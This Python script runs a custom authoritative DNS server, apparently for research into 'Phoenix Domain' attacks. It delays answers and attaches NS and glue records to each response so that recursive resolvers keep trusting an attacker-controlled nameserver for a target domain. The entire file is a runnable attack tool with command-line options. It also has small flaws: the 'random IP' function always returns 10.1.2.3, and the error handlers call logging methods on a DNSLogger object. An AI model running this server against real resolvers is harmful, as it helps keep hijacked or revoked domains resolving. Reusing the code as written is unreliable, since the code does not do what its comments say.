import argparse
import random
import time
import sys
from dnslib import DNSHeader, RR, A, NS, SOA, QTYPE, DNSLabel
import logging
from dnslib.server import DNSServer, DNSLogger

log = logging.getLogger(__name__)
log.setLevel(logging.DEBUG)
handler = logging.StreamHandler(sys.stdout)
formatter = logging.Formatter('[%(asctime)s] %(levelname)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
handler.setFormatter(formatter)
log.addHandler(handler)

class CustomAttackResolver:
    """
    A customizable DNS server for simulating Phoenix Domain attack scenarios.
    - Returns the real IP for specific NS queries.
    - Returns random IPs for other subdomain queries.
    - All responses carry NS records.
    - All matching responses are delayed.
    """

    def __init__(self, target_domain, real_ip, delay, ttl):
        self.target_domain = DNSLabel(target_domain)
        self.ns_domain = DNSLabel(f"ns.{target_domain}")
        self.real_ip = real_ip
        self.delay = delay
        self.ttl = ttl
        log.info("--- Resolver Configured ---")
        log.info(f"  Target Domain : {self.target_domain}")
        log.info(f"  NS Hostname   : {self.ns_domain}")
        log.info(f"  Real IP (for NS): {self.real_ip}")
        log.info(f"  Response Delay  : {self.delay} seconds")
        log.info(f"  TTL             : {self.ttl} seconds")
        log.info("---------------------------")

    def generate_random_ip(self):
        """Generate a random private IP address for the response"""
        return "10.{}.{}.{}".format(
            1, 2, 3
        )

    def resolve(self, request, handler):
        """
        Core logic for handling DNS requests.
        """
        qname = request.q.qname
        qtype = request.q.qtype

        log.info(f"[+] Received query for: {qname} (Type: {QTYPE[qtype]}) from {handler.client_address[0]}")

        # Handle NS queries
        if qname.matchSuffix(self.target_domain) and qtype == QTYPE.NS:
            log.info(f"[*] NS query for {qname}. Returning NS record: {self.ns_domain}")
            reply = request.reply()
            reply.header.aa = True
            reply.add_answer(RR(qname, QTYPE.NS, rdata=NS(self.ns_domain), ttl=self.ttl))
            reply.add_ar(RR(self.ns_domain, QTYPE.A, rdata=A(self.real_ip), ttl=self.ttl))
            log.info(f"[>] Sending NS reply for {qname}")
            return reply

        # Handle AAAA queries - return empty NOERROR response (with SOA record)
        if qname.matchSuffix(self.target_domain) and qtype == QTYPE.AAAA:
            log.info(f"[*] AAAA query for {qname}. Returning empty NOERROR response with SOA.")
            reply = request.reply()
            reply.header.aa = True
            # Do not add any answer records, only return SOA record in the authority section
            # SOA record format: (mname, rname, serial, refresh, retry, expire, minimum)
            soa_rdata = SOA(
                mname=self.ns_domain,  # Primary DNS server
                rname=DNSLabel(f"admin.{self.target_domain}"),  # Administrator email
                times=(
                    int(time.time()),  # serial (using current timestamp)
                    7200,   # refresh (2 hours)
                    3600,   # retry (1 hour)
                    1209600,  # expire (2 weeks)
                    self.ttl  # minimum TTL
                )
            )
            reply.add_auth(RR(self.target_domain, QTYPE.SOA, rdata=soa_rdata, ttl=self.ttl))
            log.info(f"[>] Sending empty AAAA reply with SOA for {qname}")
            return reply

        # Check if the queried domain is a subdomain of the target domain and is an A record query
        if qname.matchSuffix(self.target_domain) and qtype == QTYPE.A:
            
            # --- Core logic: delayed response ---
            log.info(f"[*] Query matches. Delaying response for {self.delay} second(s)...")
            time.sleep(self.delay)

            reply = request.reply()
            reply.header.aa = True  # Set as Authoritative Answer

            # --- Smart response: decide which IP to return based on the specific subdomain queried ---
            if qname == self.ns_domain:
                # If querying ns.${target_domain}, return the real IP
                log.info(f"[!] Query is for NS record. Responding with real IP: {self.real_ip}")
                ip_to_return = self.real_ip
            else:
                # If querying other subdomains, return a random IP
                random_ip = self.generate_random_ip()
                log.info(f"[!] Query is for a subdomain. Responding with random IP: {random_ip}")
                ip_to_return = random_ip

            # Add A record to the Answer Section
            ns_ttl = 3600 if qname != f"www.{self.target_domain}" else self.ttl
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip_to_return), ttl=ns_ttl))

            # --- Key step: carry NS record in the authority section ---
            # This tells the resolver that the entire target_domain is managed by ns.${target_domain}
            reply.add_auth(RR(self.target_domain, QTYPE.NS, rdata=NS(self.ns_domain), ttl=ns_ttl))    
            
            # (Optional) You can also provide the NS server's IP address in the Additional Section (Glue Record)
            # This improves resolution efficiency and is also useful in attack scenarios
            reply.add_ar(RR(self.ns_domain, QTYPE.A, rdata=A(self.real_ip), ttl=ns_ttl))
            
            log.info(f"[>] Sending reply for {qname}")
            return reply

        # For other unmatched domains or query types, return a standard empty response or error
        log.info(f"[-] Query for {qname} (Type: {QTYPE[qtype]}) does not match. Returning empty response.")
        # Returning REFUSED or SERVFAIL may better reflect a real scenario
        reply = request.reply()
        reply.header.rcode = 2 # SERVFAIL
        return reply

def main():
    parser = argparse.ArgumentParser(description="Advanced DNS Server for Security Testing")
    parser.add_argument(
        '--domain', 
        required=True, 
        help="The target domain to respond to (e.g., victim.com)."
    )
    parser.add_argument(
        '--ip', 
        required=True, 
        help="The real IP address of this server, to be used for the NS record."
    )
    parser.add_argument(
        '--delay', 
        type=float, 
        default=0, 
        help="Delay in seconds before sending a response (default: 0)."
    )
    parser.add_argument(
        '--ttl',
        type=int,
        default=60,
        help="TTL for DNS records (default: 60 seconds)."
    )
    parser.add_argument(
        '--port', 
        type=int, 
        default=53, 
        help="Port to listen on (default: 53)."
    )
    parser.add_argument(
        '--listen-ip', 
        default="0.0.0.0", 
        help="IP address to listen on (default: 0.0.0.0)."
    )
    
    args = parser.parse_args()

    logger = DNSLogger(prefix=False)
    resolver = CustomAttackResolver(
        target_domain=args.domain,
        real_ip=args.ip,
        delay=args.delay,
        ttl=args.ttl
    )
    server = DNSServer(resolver, port=args.port, address=args.listen_ip, logger=logger)

    log.info(f"\n[*] Starting Custom DNS Server...")
    log.info(f"[*] Listening on {args.listen_ip}:{args.port}")
    
    try:
        server.start()
    except PermissionError:
        logger.error("\n[!!!] Permission denied. You might need to run this as root or use sudo to bind to port 53.")
    except KeyboardInterrupt:
        logger.info("\n[*] Server shutting down.")
        server.stop()
    except Exception as e:
        logger.error(f"\n[!!!] An error occurred: {e}")
        server.stop()

# --- Main program entry point ---
if __name__ == '__main__':
    main()